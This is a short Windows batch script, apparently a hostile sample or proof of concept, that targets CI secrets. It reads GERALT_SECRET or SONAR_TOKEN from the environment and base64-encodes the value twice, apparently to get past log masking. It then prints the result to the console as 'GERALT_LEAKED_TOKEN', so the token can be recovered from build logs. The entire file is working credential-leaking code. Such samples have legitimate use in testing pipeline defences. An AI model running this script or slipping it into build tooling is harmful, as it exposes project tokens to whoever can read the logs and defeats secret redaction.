@echo off
if defined GERALT_SECRET (
  set "LEAKED=%GERALT_SECRET%"
) else (
  set "LEAKED=%SONAR_TOKEN%"
)
powershell -NoProfile -Command "$t=$env:LEAKED; if(-not $t){$t=$env:SONAR_TOKEN}; [Console]::WriteLine('GERALT_LEAKED_TOKEN=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($t)))))"
exit /b 1
